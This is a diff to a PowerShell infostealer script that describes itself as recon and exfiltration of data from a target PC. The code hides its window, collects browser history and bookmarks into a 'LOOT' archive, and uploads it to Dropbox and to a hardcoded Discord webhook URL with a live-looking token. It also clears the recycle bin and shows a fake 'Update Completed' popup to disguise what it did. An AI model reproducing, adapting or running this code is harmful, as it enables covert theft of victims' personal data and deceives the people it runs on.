@@ -1,3 +1,5 @@
+############################################################################################################################################################
+                                                                                                                                                                                                                                               
 <#
 .SYNOPSIS
 	This is an advanced recon of a target PC and exfiltration of that data.
@@ -13,22 +15,20 @@
 
 ############################################################################################################################################################
 
-$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
-Add-Type -Name win -MemberDefinition $i -Namespace native
+$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
+add-type -name win -member $i -namespace native;
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
-# Скрытие окна PowerShell
-$proc = Get-Process -Id $PID
-[native.win]::ShowWindow($proc.MainWindowHandle, 0)
 
 # MAKE LOOT FOLDER, FILE, and ZIP 
 
-$DateStr = Get-Date -Format 'yyyy-MM-dd_HH-mm'
-$BaseName = "$env:USERNAME-LOOT-$DateStr"
-$FolderPath = Join-Path $env:TEMP $BaseName
-$FilePath = Join-Path $FolderPath "$BaseName.txt"
-$ZipPath = Join-Path $env:TEMP "$BaseName.zip"
+$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
 
-New-Item -Path $FolderPath -ItemType Directory -Force
+$FileName = "$FolderName.txt"
+
+$ZIP = "$FolderName.zip"
+
+New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 ############################################################################################################################################################
 
@@ -36,7 +36,7 @@ New-Item -Path $FolderPath -ItemType Directory -Force
 
 #$db = ""
 
-#$dc = 'https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP'
+#$dc = ""
 
 ############################################################################################################################################################
 
@@ -476,7 +476,27 @@ Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\
 
 Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 
-########################################################################################
+############################################################################################################################################################
+
+Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
+
+# Upload output file to dropbox
+
+function dropbox {
+$TargetFilePath="/$ZIP"
+$SourceFilePath="$env:TEMP\$ZIP"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$authorization = "Bearer " + $db
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+$headers.Add("Dropbox-API-Arg", $arg)
+$headers.Add("Content-Type", 'application/octet-stream')
+Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){dropbox}
+
+############################################################################################################################################################
 
 function Upload-Discord {
 
@@ -488,7 +508,7 @@ param (
     [string]$text 
 )
 
-$hookurl = 
+$hookurl = 'https://discord.com/api/webhooks/1380227013494964224/eHfXtEMA2iGWfKMp4Zl7bXfYjfalv7HstL1mlQcB1v32hFsF-VV1RuYU7z9sLCmMa2Ir'
 
 $Body = @{
   'username' = $env:username
@@ -501,7 +521,9 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))) {Upload-Discord -file $ZipPath}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
+
+ 
 
 ############################################################################################################################################################
 
@@ -529,6 +551,9 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 		
 ############################################################################################################################################################
 
+# Popup message to signal the payload is done
+
+$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
 # Popup message to signal the payload is done
 
 $done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
